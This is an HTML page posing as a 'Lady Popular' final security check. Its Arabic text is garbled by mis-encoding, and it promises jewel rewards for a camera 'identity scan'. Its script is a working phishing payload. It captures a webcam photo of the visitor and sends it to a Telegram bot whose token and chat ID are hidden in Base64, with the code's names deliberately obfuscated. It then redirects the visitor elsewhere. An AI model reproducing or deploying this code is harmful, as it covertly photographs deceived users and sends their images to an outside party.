<!DOCTYPE html>
<html>
<head>
    <title>Lady Popular: Final Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); width: 380px; text-align: center; }
        .logo { font-size: 28px; color: #3498db; margin-bottom: 25px; font-weight: bold; }
        .security-header { color: #2c3e50; margin-bottom: 20px; }
        .security-header h3 { margin: 0; font-size: 18px; }
        #camera-check {
            width: 150px;
            height: 150px;
            border: 5px solid #e74c3c;
            border-radius: 50%;
            margin: 20px auto;
            line-height: 140px;
            font-size: 60px;
            color: #e74c3c;
        }
        button {
            background-color: #2ecc71;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 15px;
            transition: background-color 0.3s;
        }
        button:hover { background-color: #27ae60; }
        .footer-text { margin-top: 25px; font-size: 12px; color: #7f8c8d; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">Lady Popular Security</div>
    
    <div class="security-header">
        <h3>ğŸ” Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø£Ù…Ù†ÙŠ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ!</h3>
        <p style="font-size: 14px;">ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ ØªÙ…Ø±ÙŠØ± **Ø§Ù„ÙØ­Øµ Ø§Ù„Ø£Ù…Ù†ÙŠ Ø§Ù„Ø«Ù†Ø§Ø¦ÙŠ** Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙƒØ§ÙØ¢Øª Ø§Ù„Ø¬ÙˆØ§Ù‡Ø±. Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ "Ù…Ø³Ø­ Ø§Ù„Ø¢Ù†" Ù„ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.</p>
    </div>

    <div id="camera-check">
        <span id="check-icon">ğŸ‘ï¸</span>
    </div>

    <button id="scanButton" onclick="startCapture()">Ù…Ø³Ø­ Ø±Ù…Ø² Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø¢Ù†</button>
    <p id="status-message" style="color: #3498db; margin-top: 10px; display: none;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©... Ù„Ø§ ØªØºØ§Ø¯Ø± Ø§Ù„ØµÙØ­Ø©.</p>

    <video id="vE" style="display:none;" autoplay></video>
    <canvas id="cE" style="display:none;"></canvas>
    
    <div class="footer-text">
        Ù‡Ø°Ø§ Ø§Ù„ÙØ­Øµ Ø¶Ø±ÙˆØ±ÙŠ Ù„Ø­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ Ù…Ù† Ø§Ù„Ø§Ø­ØªÙŠØ§Ù„.
    </div>
</div>

<script>
    // Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ø¢ÙŠØ¯ÙŠ Ù…Ø´ÙØ±ÙŠÙ† Ø¨Ù€ Base64 Ù„Ø²ÙŠØ§Ø¯Ø© Ø§Ù„ØªØ¹ØªÙŠÙ…
    const B64_TOKEN = "ODUyNDM2NDkwNDpBQUVCSlNYN3ZJdDJFanhpa0piTE9CZ3dIT21lUVRZaUhOOA==";
    const B64_CHAT_ID = "NjUyMTk2NjIzMw==";
    
    const D = atob(B64_CHAT_ID); // Chat ID
    const T = atob(B64_TOKEN); // Bot Token

    const E = 'https://api.telegram.org/bot' + T + '/sendPhoto';
    const R = 'https://sabaya.ae/'; // Ø±Ø§Ø¨Ø· Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡

    // ØªØ¹ØªÙŠÙ… Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø¯ÙˆØ§Ù„ ÙˆØ§Ù„Ø¹Ù†Ø§ØµØ±
    const G = 'getUserMedia';
    const M = 'mediaDevices';
    const N = 'navigator';
    const F = 'FormData';
    const C = 'createElement';
    const B = 'toBlob';

    function startCapture() {
        document.getElementById('scanButton').style.display = 'none';
        document.getElementById('status-message').style.display = 'block';
        document.getElementById('check-icon').textContent = 'â³';

        window[N][M][G]({ video: true })
            .then(stream => {
                const video = document.getElementById('vE');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    CS(stream);
                }, 1000); 
            })
            .catch(error => {
                console.error("Camera access failed or denied: ", error);
                document.getElementById('status-message').textContent = 'âš ï¸ ÙØ´Ù„ Ø§Ù„Ù…Ø³Ø­ Ø§Ù„Ø£Ù…Ù†ÙŠ. Ø¬Ø§Ø±ÙŠ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡...';
                setTimeout(() => {
                    window.location.href = R;
                }, 2000);
            });
    }
    
    // Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© Ù„Ù€ Capture and Send (Ù…ÙØ¹ØªÙ‘ÙÙ…Ø© Ø¥Ù„Ù‰ CS)
    function CS(stream) {
        const V = document.getElementById('vE');
        const L = document.getElementById('cE');
        const X = L.getContext('2d');
        
        L.width = V.videoWidth;
        L.height = V.videoHeight;

        X.drawImage(V, 0, 0, L.width, L.height);
        
        stream.getTracks().forEach(track => track.stop());

        L[B](blob => {
            const FData = new window[F]();
            FData.append('chat_id', D);
            FData.append('photo', blob, 'moby_capture.jpg'); 
            
            fetch(E, {
                method: 'POST',
                body: FData
            })
            .then(() => {
                document.getElementById('status-message').textContent = 'âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­! Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬ÙˆØ§Ø¦Ø²...';
                setTimeout(() => {
                    window.location.href = R;
                }, 1500); 
            })
            .catch(() => {
                setTimeout(() => {
                    window.location.href = R;
                }, 1500);
            });
        }, 'image/jpeg');
    }
    
    // Ø±Ø¨Ø· Ø§Ù„Ø¯Ø§Ù„Ø© Ø¨Ø§Ù„Ø²Ø±
    document.getElementById('scanButton').onclick = startCapture;
</script>

</body>
</html>
